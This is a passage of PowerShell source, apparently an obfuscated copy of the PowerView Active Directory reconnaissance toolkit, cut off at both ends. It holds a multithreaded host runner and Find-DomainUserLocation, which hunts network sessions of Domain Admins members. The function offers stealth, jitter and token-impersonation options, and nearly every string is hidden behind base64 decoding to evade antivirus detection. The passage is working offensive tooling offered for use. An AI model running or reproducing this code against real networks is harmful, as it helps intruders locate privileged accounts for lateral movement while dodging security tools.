TAFUASQBDAHUAbAB0AHUAcgBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFYAZQByAHMAaQBvAG4AVABhAGIAbABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABXAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGUAbABsAEkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAGQASABhAHMAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAZQA='))))
            ForEach ($Var in $MyVars) {
                if ($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }
            ForEach ($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()
        $Method = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBlAGcAaQBuAEkAbgB2AG8AawBlAA=='))) }) {
            $MethodParameters = $M.GetParameters()
            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))) -and $MethodParameters[1].Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwB1AHQAcAB1AHQA')))) {
                $Method = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }
        $Jobs = @()
        $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count)"
        if ($Threads -ge $ComputerName.Length) {
            $Threads = $ComputerName.Length
        }
        $ElementSplitSize = [Int]($ComputerName.Length/$Threads)
        $ComputerNamePartitioned = @()
        $Start = 0
        $End = $ElementSplitSize
        for($i = 1; $i -le $Threads; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $Threads) {
                $End = $ComputerName.Length
            }
            $List.AddRange($ComputerName[$Start..($End-1)])
            $Start += $ElementSplitSize
            $End += $ElementSplitSize
            $ComputerNamePartitioned += @(,@($List.ToArray()))
        }
        Write-Verbose "[New-ThreadedFunction] Total number of threads/partitions: $Threads"
        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
            $PowerShell = [PowerShell]::Create()
            $PowerShell.runspacepool = $Pool
            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))), $ComputerNamePartition)
            if ($ScriptParameters) {
                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                }
            }
            $Output = New-Object Management.Automation.PSDataCollection[Object]
            $Jobs += @{
                PS = $PowerShell
                Output = $Output
                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }
    END {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFQAaAByAGUAYQBkAHMAIABlAHgAZQBjAHUAdABpAG4AZwA=')))
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
        $SleepSeconds = 100
        Write-Verbose "[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup..."
        for ($i=0; $i -lt $SleepSeconds; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }
        $Pool.Dispose()
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAGEAbABsACAAdABoAHIAZQBhAGQAcwAgAGMAbwBtAHAAbABlAHQAZQBkAA==')))
    }
}
function Find-DomainUserLocation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [Alias('AllowDelegation')]
        [Switch]
        $UserAllowDelegation,
        [Switch]
        $CheckAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $ShowAll,
        [Switch]
        $Stealth,
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $StealthSource = 'All',
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = $Unconstrained }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = $OperatingSystem }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = $ServicePack }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $UserSearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))] = $UserAllowDelegation }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $TargetComputers = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            $TargetComputers = @($ComputerName)
        }
        else {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAYQBsAHQAaAA=')))]) {
                Write-Verbose "[Find-DomainUserLocation] Stealth enumeration using source: $StealthSource"
                $TargetComputerArrayList = New-Object System.Collections.ArrayList
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQB8AEEAbABsAA==')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZgBpAGwAZQAgAHMAZQByAHYAZQByAHMA')))
                    $FileServerSearcherArguments = @{}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $FileServerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { $FileServerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { $FileServerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $FileServerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $FileServerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $FileServerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $FileServerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $FileServerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $FileServerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    $FileServers = Get-DomainFileServer @FileServerSearcherArguments
                    if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }
                    $TargetComputerArrayList.AddRange( $FileServers )
                }
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABGAFMAfABBAGwAbAA=')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAARABGAFMAIABzAGUAcgB2AGUAcgBzAA==')))
                }
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAHwAQQBsAGwA')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZABvAG0AYQBpAG4AIABjAG8AbgB0AHIAbwBsAGwAZQByAHMA')))
                    $DCSearcherArguments = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $DCSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { $DCSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $DCSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $DCSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
                    $TargetComputerArrayList.AddRange( $DomainControllers )
                }
                $TargetComputers = $TargetComputerArrayList.ToArray()
            }
            else {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAYQBsAGwAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
                $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAE4AbwAgAGgAbwBzAHQAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $CurrentUser = $Credential.GetNetworkCredential().UserName
        }
        else {
            $CurrentUser = ([Environment]::UserName).ToLower()
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAG8AdwBBAGwAbAA=')))]) {
            $TargetUsers = @()
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)"
        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAE4AbwAgAHUAcwBlAHIAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAHQAYQByAGcAZQB0AA==')))
        }
        $HostEnumBlock = {
            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)
            if ($TokenHandle) {
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }
            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Sessions = Get-NetSession -ComputerName $TargetComputer
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.UserName
                        $CName = $Session.CName
                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }
                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkACQA'))))) {
